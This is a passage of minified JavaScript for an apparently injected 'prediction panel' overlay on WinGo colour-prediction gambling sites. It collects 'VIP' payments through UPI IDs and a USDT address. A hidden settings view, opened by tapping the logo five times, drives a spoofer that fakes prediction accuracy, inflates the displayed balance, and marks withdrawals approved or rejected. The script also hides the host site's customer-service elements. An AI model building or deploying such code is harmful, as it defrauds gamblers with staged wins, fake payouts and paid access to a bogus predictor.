                console.error("Copy failed:", W);
              });
          }),
          n.querySelector("#vip-upi-hint").addEventListener("click", () => {
            Kn = (Kn + 1) % K.upi.length;
            let g = K.upi[Kn];
            n.querySelector("#vip-address-val").textContent = g;
            let M = encodeURIComponent(g),
              W = encodeURIComponent("VIP"),
              L = encodeURIComponent(K.amount),
              q = `upi://pay?pa=${M}&pn=${W}&am=${L}&cu=INR`,
              y = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(q)}`;
            n.querySelector("#vip-qr-img").src = y;
          }),
          n
            .querySelector("#btn-settings-back")
            .addEventListener("click", () => this._setView("menu")),
          n.querySelector("#btn-spoof-reset").addEventListener("click", () => {
            (window.__wgSpoofer.saveSetting("accuracy", 70),
              window.__wgSpoofer.saveSetting("balanceOffset", 5000),
              window.__wgSpoofer.resetBalance(),
              this._syncSettings());
          });
        let t = [],
          e = n.querySelector(".panel-title img");
        e.style.pointerEvents = "auto";
        let o = () => {
          if (!window.__wgSpoofer || !window.__wgSpoofer.isVip()) return;
          if ((t.push(Date.now()), t.length >= 5)) {
            if (t[t.length - 1] - t[t.length - 5] < 2000)
              ((t.length = 0), this._setView("settings"), this._syncSettings());
            if (t.length > 10) t.splice(0, t.length - 5);
          }
        };
        (e.addEventListener(
          "pointerdown",
          (g) => {
            (g.stopImmediatePropagation(), g.stopPropagation());
          },
          !0,
        ),
          e.addEventListener("pointerup", o, !0),
          e.addEventListener("click", o));
        let i = n.querySelector("#spoof-acc-range"),
          l = n.querySelector("#spoof-acc-num"),
          f = n.querySelector("#spoof-bal");
        (i.addEventListener("input", () => {
          ((l.value = i.value), window.__wgSpoofer.saveSetting("accuracy", parseInt(i.value)));
        }),
          l.addEventListener("input", () => {
            ((i.value = l.value), window.__wgSpoofer.saveSetting("accuracy", parseInt(l.value)));
          }),
          f.addEventListener("input", () => {
            (window.__wgSpoofer.saveSetting("balanceOffset", parseInt(f.value) || 0),
              window.__wgSpoofer.resetBalance());
          }));
        let c = n.querySelector("#spoof-withdrawals-list");
        if (c)
          c.addEventListener("click", (g) => {
            let M = g.target.closest("button[data-id]");
            if (!M) return;
            let W = M.getAttribute("data-id"),
              L = M.classList.contains("btn-approve") ? 1 : 0;
            if (window.__wgSpoofer) window.__wgSpoofer.updateWithdrawalStatus(W, L);
            this._renderWithdrawals();
          });
        let p = In();
        if (p) {
          let g = n.querySelector("#pro-mode");
          if (g) g.textContent = lt(p);
          if (!ct().length) en();
        }
        let w = document.createElement("style");
        ((w.textContent = ".customer,.changlongEnter{display:none!important}"),
          document.head.appendChild(w),
          yn(n),
          Me(500),
          he());
        let S = () => {
          let g = document.querySelector("#app");
          if (!g) return;
          let M = g.getBoundingClientRect();
          (this.style.setProperty("--bv-left", M.left + "px"),
            this.style.setProperty("--bv-width", M.width + "px"));
        };
        (S(), new ResizeObserver(S).observe(document.documentElement));
        let $ = (g) => {
          if (typeof g?.detail?.balance === "number") window.__wg_balance = g.detail.balance;
          this._checkBalance();
        };
        (window.addEventListener("wg-qualified", $), window.addEventListener("wg-balance", $));
        setInterval(() => this._checkBalance(), 1000);
      }
      _getLiveBalance() {
        let n = window.__wg_balance;
        if (typeof n !== "number") {
          try {
            let u = JSON.parse(localStorage.getItem("userInfo") || "{}");
            let b = Number(u?.amount ?? u?.balance);
            if (Number.isFinite(b)) n = b;
          } catch (e) {}
        }
        if (typeof n !== "number") n = 0;

        if (window.__wgSpoofer && window.__wgSpoofer.isVip())
          try {
            let t = JSON.parse(localStorage.getItem("wg_spoof_state"));
            if (t && t.balance !== null) n = t.balance;
          } catch (t) {}
        return n;
      }
      _checkBalance() {
        let n = this._getLiveBalance();
        if (this._gateBal) this._gateBal.textContent = "₹" + Number(n).toFixed(2);

        if (this._activeSection === "pro" || this._gateView.style.display === "block") {
          if (n < 100) {
            ((this._body.style.display = "none"), (this._gateView.style.display = "block"));
          } else {
            ((this._body.style.display = "block"), (this._gateView.style.display = "none"));
            if (this._activeSection === "pro") {
              let proView = this.shadowRoot.querySelector(".view-pro");
              if (proView && !proView.classList.contains("active")) {
                this._setView("pro");
                ce(-1);
                tn("loading");
                Te();
              }
            }
          }
        }
      }
      _showPanel() {
        this._mode = "panel";
        this._logo.style.display = "none";
        this._panel.classList.add("active");

        let now = Date.now();
        if (now - (this._lastActiveTime || 0) > 300000) {
          this._activeSection = "menu";
        }
        this._lastActiveTime = now;

        if (this._activeSection === "pro") {
          let bal = this._getLiveBalance();
          if (bal >= 100) {
            this._gateView.style.display = "none";
            this._body.style.display = "block";
            this._setView("pro");
            ce(-1);
            tn("loading");
            Te();
          } else {
            this._activeSection = "menu";
            this._gateView.style.display = "none";
            this._body.style.display = "block";
            this._setView("menu");
          }
        } else {
          this._gateView.style.display = "none";
          this._body.style.display = "block";
          this._setView("menu");
        }
        let t = Xn("panel");
        if (t) Zn(this, t);
        else re(this, this._panel);
      }
      _showLogo() {
        ((this._mode = "logo"),
          this._panel.classList.remove("active"),
          (this._logo.style.display = "block"),
          Zn(this, Xn("logo")));
      }
      _setView(n) {
        this.shadowRoot.querySelectorAll(".view").forEach((e) => e.classList.remove("active"));
        let t = this.shadowRoot.querySelector(".view-" + n);
        if (t) t.classList.add("active");
      }
      _startVipCheckout(n) {
        this._checkoutType = n;
        let t = this.shadowRoot,
          e = t.querySelector("#vip-loader");
        ((e.style.display = "flex"),
          setTimeout(() => {
            e.style.display = "none";
            let i =
              "VIP-" +
              Math.floor(Math.random() * 16777215)
                .toString(16)
                .toUpperCase()
                .padStart(6, "0");
            if (((t.querySelector("#vip-order-id").textContent = i), vn)) clearInterval(vn);
            let l = "",
              f = "",
              c = "";
            if (n === "upi") {
              Kn = 0;
              let S = K.upi;
              ((l = S[0]),
                (f = "₹" + K.amount),
                (t.querySelector("#vip-checkout-title").textContent = "UPI Payment"),
                (t.querySelector("#vip-address-lbl").textContent = "UPI ID"),
                (t.querySelector("#vip-network-lbl").style.display = "none"));
              let $ = encodeURIComponent(l),
                g = encodeURIComponent("VIP"),
                M = encodeURIComponent(K.amount),
                W = `upi://pay?pa=${$}&pn=${g}&am=${M}&cu=INR`;
              if (
                ((c = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(W)}`),
                S.length > 1)
              )
                t.querySelector("#vip-upi-hint").style.display = "flex";
              else t.querySelector("#vip-upi-hint").style.display = "none";
            } else
              ((l = K.crypto.trc20),
                (f = `$${K.cryptoAmountUsd.toFixed(2)} USDT`),
                (t.querySelector("#vip-checkout-title").textContent = "Crypto USDT"),
                (t.querySelector("#vip-address-lbl").textContent = "USDT Address"),
                (t.querySelector("#vip-network-lbl").style.display = "inline-block"),
                (t.querySelector("#vip-upi-hint").style.display = "none"),
                (c = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(l)}`));
            ((t.querySelector("#vip-address-val").textContent = l),
              (t.querySelector("#vip-checkout-amount").textContent = f),
              (t.querySelector("#vip-qr-img").src = c));
            let p = Re(),
              w = () => {
                let S = be(p);
                if (((t.querySelector("#vip-checkout-timer").textContent = S.text), S.done))
                  clearInterval(vn);
              };
            if ((w(), p > Date.now())) vn = setInterval(w, 1000);
            this._setView("vip-checkout");
          }, 2500));
      }
      _renderVipHistory() {
        let t = this.shadowRoot.querySelector("#vip-history-list");
        if (!t) return;
        let e = [];
        try {
          e = JSON.parse(localStorage.getItem("wg_vip_orders") || "[]");
        } catch (o) {}
        if (e.length === 0) {
          t.innerHTML = `<div class="vip-history-empty">
  <svg
    viewBox="0 0 24 24"
    width="22"
    height="22"
    fill="none"
    stroke="currentColor"
    stroke-width="1.8"
    stroke-linecap="round"
    stroke-linejoin="round"
  >
    <circle cx="12" cy="12" r="10" />
    <polyline points="12 6 12 12 16 14" />
  </svg>
  <span class="vip-history-empty-title">No Orders Yet</span>
  <span class="vip-history-empty-sub">Completed payments will appear here</span>
</div>
`;
          return;
        }
        t.innerHTML = e
          .map((o) => {
            let i = new Date(o.date).toLocaleString(),
              l = String(o.type).toLowerCase() === "crypto",
              f = l ? "vip-history-crypto" : "vip-history-upi",
              c = l ? "Crypto" : "UPI",
              p = String(o.status || "Pending"),
              w =
                p === "Approved"
                  ? "status-approved"
                  : p === "Rejected"
                    ? "status-rejected"
                    : "status-pending",
              S =
                p === "Rejected" && o.remark
                  ? `<div class="vip-history-remark">${o.remark}</div>
`
                  : "";
            return `<div class="vip-history-row ${f}">
  <div class="vip-history-row-top">
    <span class="vip-history-type">${c}</span>
    <span class="vip-history-status ${w}">${p}</span>
  </div>
  <span class="vip-history-ref">Ref · ${o.utr}</span>
  <span class="vip-history-date">${i}</span>
  ${S}
</div>
`;
          })
          .join("");
      }
      async _syncVipHistory() {
        let n = [];
        try {
          n = JSON.parse(localStorage.getItem("wg_vip_orders") || "[]");
        } catch (e) {}
        if (!n.length) return;
        let t = n.map((e) => e.utr).filter(Boolean);
        if (!t.length) return;
        try {
          let e = await fetch("/ar-api/vip-sync", {
            method: "POST",
            headers: {
              "content-type": "application/json",
            },
            body: JSON.stringify({
              utrs: t,
            }),
          });
          if (!e.ok) return;
          let o = await e.json();
          if (!o.ok || !o.orders) return;
          let i = !1;
          for (let l of n) {
            let f = o.orders[l.utr];
            if (!f) continue;
            if (l.status !== f.status || (l.remark || "") !== (f.remark || ""))
              ((l.status = f.status), (l.remark = f.remark || ""), (i = !0));
          }
          if (i)
            (localStorage.setItem("wg_vip_orders", JSON.stringify(n)), this._renderVipHistory());
        } catch (e) {}
      }
      _syncSettings() {
        if (!window.__wgSpoofer) return;
        let n = window.__wgSpoofer.getSettings(),
          t = this.shadowRoot;
        ((t.querySelector("#spoof-acc-range").value = n.accuracy),
          (t.querySelector("#spoof-acc-num").value = n.accuracy),
          (t.querySelector("#spoof-bal").value = n.balanceOffset),
          this._renderWithdrawals());
      }
      _renderWithdrawals() {
        if (!window.__wgSpoofer) return;
        let n = window.__wgSpoofer.getWithdrawals(),
          t = this.shadowRoot.querySelector("#spoof-withdrawals-list");
        if (!t) return;
        t.innerHTML = "";
        let e = [];
        for (let i in n) e.push(n[i]);
        e.sort((i, l) => l.addTime - i.addTime);
        let o = document.createDocumentFragment();
        (e.forEach((i) => {
          let l = document.createElement("div");
          l.className = "w-item";
          let f = "Processing",
            c = "status-processing";
          if (i.state === 1 || i.state === 2) ((f = "Success"), (c = "status-success"));
          else if (i.state === 0 || i.state === 4) ((f = "Failed"), (c = "status-failed"));
          ((l.innerHTML = `<div class="w-info">
  <div class="w-id">${i.withdrawNumber}</div>
  <div class="w-amt">₹${i.amount}</div>
  <div class="w-time">${new Date(i.addTime).toLocaleString()}</div>
  <div class="w-state ${c}">${f}</div>
</div>
<div class="w-actions">
  <button class="btn-approve" data-id="${i.withdrawNumber}">Approve</button>
  <button class="btn-reject" data-id="${i.withdrawNumber}">Reject</button>
</div>
`),
            o.appendChild(l));
        }),
          t.appendChild(o));
      }
    },
  );
function Vn() {
  let n = location.hash.includes("/saasLottery/WinGo"),
    t = document.querySelector("prediction-panel");
  if (!t) ((t = document.createElement("prediction-panel")), document.body.appendChild(t));
  t.dataset.route = n ? "game" : "other";
  let e = document.querySelector(".timer-card.active .card-title, .TimeLeft__C-name"),
    o = String(e?.textContent || "")
      .toLowerCase()
      .replace(/\s+/g, ""),
    i = "";
  if (o.includes("wingo30")) i = "WinGo_30S";
  else if (o.includes("wingo1min") || o.includes("wingo1m")) i = "WinGo_1M";
  else if (o.includes("wingo3min") || o.includes("wingo3m")) i = "WinGo_3M";
  else if (o.includes("wingo5min") || o.includes("wingo5m")) i = "WinGo_5M";
  if (!i) {
    let l = location.hash.match(/gameCode=(WinGo_\w+)/);
    i = l ? l[1] : "";
  }
  if (i && i !== In()) ft(i);
}
["pushState", "replaceState"].forEach((n) => {
  let t = history[n];
  history[n] = function (...e) {
    (t.apply(this, e), Vn());
  };
});
window.addEventListener("hashchange", Vn);
setInterval(Vn, 500);
setTimeout(Vn, 100);
